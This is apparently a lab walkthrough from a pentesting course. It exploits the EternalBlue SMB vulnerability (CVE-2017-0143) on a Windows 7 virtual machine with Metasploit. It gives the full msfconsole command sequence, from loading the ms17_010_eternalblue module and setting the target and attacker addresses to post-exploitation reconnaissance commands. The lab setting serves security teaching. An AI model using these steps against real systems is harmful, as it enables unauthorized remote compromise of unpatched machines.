Exploitation on a Windows 7 VM using Metasploit.

A prerequisite for this session would be a vulnerability scan using Nessus on the victim machine that we performed on Day 4.
Through this scan, we come to know that the vulnerability: Microsoft CVE-2017–0143: Windows SMB Remote Code Execution Vulnerability will help us to gain access to the victim machine.
The steps and commands used are:
1. Open the terminal and initialize msfdb:
msfdb init
2. Start PostgreSQL server:
service postgresql start
3. Start the msfconsole:
msfconsole
4. search for the vulnerability script:
search 2017–0143
5. get more info on the script:
info exploit/windows/smb/ms17_010_eternalblue
6. make the msfconsole to use our script
use exploit/windows/smb/ms17_010_eternalblue
7. check for available parameters
show options
8. set rhost to our victim IP address
set RHOSTS <IP>
9. here we to verify if LHOST = attacker IP and RPORT = vulnerable port
10. lastly we need to run our script:
exploit
After successfully running our script we should see something like this:
Once access is gained, we should try the following commands:
sysinfo // information about the victim's computer
getuid // As which user have we gained the access
ipconfig // Victim machines IP addresses

For more commands, we can type help to get the whole list of available commands
